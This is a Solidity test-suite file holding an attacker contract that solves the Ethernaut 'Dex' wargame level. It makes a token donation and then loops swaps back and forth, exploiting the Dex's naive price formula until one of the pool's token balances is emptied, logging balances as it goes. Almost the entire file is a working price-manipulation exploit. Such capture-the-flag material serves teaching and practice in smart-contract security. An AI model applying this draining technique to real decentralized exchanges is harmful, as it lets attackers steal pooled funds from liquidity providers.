// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {Dex} from "../../src/ethernaut/22_Dex/Dex.sol";

import "openzeppelin-contracts-v5.5.0/token/ERC20/IERC20.sol";

contract Dex_Attacker {
	address player;
	Dex dex;
	
	constructor(Dex coreInst_) payable {
		player = msg.sender;
		dex = coreInst_;
	}
	
	receive() external payable {}
	
	function doAttack() public {
		console.log("IERC20(dex.token1()).balanceOf(address(this))", IERC20(dex.token1()).balanceOf(address(this)));
		console.log("IERC20(dex.token2()).balanceOf(address(this))", IERC20(dex.token2()).balanceOf(address(this)));
		
		// 捐献攻击
		uint256 amountToken2Donate = IERC20(dex.token1()).balanceOf(address(this)) - 1 ether;
		IERC20(dex.token2()).transfer(address(dex), amountToken2Donate);
		
		printData();
		
		while(true) {
			uint256 amountDexToken1 = IERC20(dex.token1()).balanceOf(address(dex));
			uint256 amountDexToken2 = IERC20(dex.token2()).balanceOf(address(dex));
			
			uint256 amountThisToken1 = IERC20(dex.token1()).balanceOf(address(this));
			uint256 amountThisToken2 = IERC20(dex.token2()).balanceOf(address(this));
			
			uint256 amountGetSwapPrice_1_2 = dex.getSwapPrice(address(dex.token1()), address(dex.token2()), 1 ether);
			uint256 amountGetSwapPrice_2_1 = dex.getSwapPrice(address(dex.token2()), address(dex.token1()), 1 ether);
			
			bool need_1_2 = amountGetSwapPrice_1_2 > 1 ether;
			bool need_2_1 = amountGetSwapPrice_2_1 > 1 ether;
			
			uint256 amountTrySwap = 0;
			if (need_1_2) {
				// 使用 token1 兑换 token2，尝试拿出最大值来兑换
				amountTrySwap = (amountDexToken1 > amountThisToken1) ? amountThisToken1 : amountDexToken1;
				IERC20(dex.token1()).approve(address(dex), amountTrySwap);
				dex.swap(dex.token1(), dex.token2(), amountTrySwap);
			} else {
				// 使用 token2 兑换 token1，尝试拿出最大值来兑换
				amountTrySwap = (amountDexToken2 > amountThisToken2) ? amountThisToken2 : amountDexToken2;
				IERC20(dex.token2()).approve(address(dex), amountTrySwap);
				dex.swap(dex.token2(), dex.token1(), amountTrySwap);
			}
			
			if (IERC20(dex.token1()).balanceOf(address(dex)) == 0) {
				break;
			}
			if (IERC20(dex.token2()).balanceOf(address(dex)) == 0) {
				break;
			}
			
			printData();
		}
	}
	
	function printData() public view {
		console.log("IERC20(dex.token1()).balanceOf(address(dex))", IERC20(dex.token1()).balanceOf(address(dex)));
		console.log("IERC20(dex.token2()).balanceOf(address(dex))", IERC20(dex.token2()).balanceOf(address(dex)));
		console.log("IERC20(dex.token1()).balanceOf(address(this))", IERC20(dex.token1()).balanceOf(address(this)));
		console.log("IERC20(dex.token2()).balanceOf(address(this))", IERC20(dex.token2()).balanceOf(address(this)));
		
		uint256 amountGetSwapPrice_1_2 = dex.getSwapPrice(address(dex.token1()), address(dex.token2()), 1 ether);
		uint256 amountGetSwapPrice_2_1 = dex.getSwapPrice(address(dex.token2()), address(dex.token1()), 1 ether);
		console.log("1 -> 2 | amountGetSwapPrice", amountGetSwapPrice_1_2);
		console.log("2 -> 1 | amountGetSwapPrice", amountGetSwapPrice_2_1);
		
		console.log("");
	}
}
